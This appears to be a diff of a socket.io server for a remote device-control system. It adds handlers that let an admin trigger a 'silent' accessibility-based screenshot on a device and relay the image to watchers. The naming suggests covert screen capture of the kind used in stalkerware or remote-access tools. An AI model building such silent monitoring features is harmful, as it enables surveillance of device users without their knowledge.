@@ -176,6 +176,38 @@ function setupSilentStreamHandlers(io, socket) {
     });
 
     /**
+     * Admin requests a screenshot for background rendering
+     */
+    socket.on('silent-screen:capture-background', ({ deviceId }) => {
+        if (!deviceId) return;
+
+        console.log(`[SILENT] Background screenshot request for: ${deviceId}`);
+
+        // Send command to device to capture a screenshot
+        io.to(`device:${deviceId}`).emit('command:execute', {
+            id: `silent-screenshot-${Date.now()}`,
+            type: 'capture_accessibility_screenshot',
+            payload: {}
+        });
+    });
+
+    /**
+     * Screenshot data from device - forward to requesting admin
+     */
+    socket.on('silent-screen:screenshot-data', (data) => {
+        const deviceId = getDeviceIdFromSocket(socket);
+        if (!deviceId) return;
+
+        console.log(`[SILENT] Screenshot received from ${deviceId}, size: ${data.imageData?.length || 0} bytes`);
+
+        // Forward to all watchers of this device
+        io.to(`silent-stream:${deviceId}`).emit('silent-screen:screenshot', {
+            deviceId,
+            imageData: data.imageData
+        });
+    });
+
+    /**
      * Handle socket disconnect - cleanup watchers
      */
     socket.on('disconnect', () => {
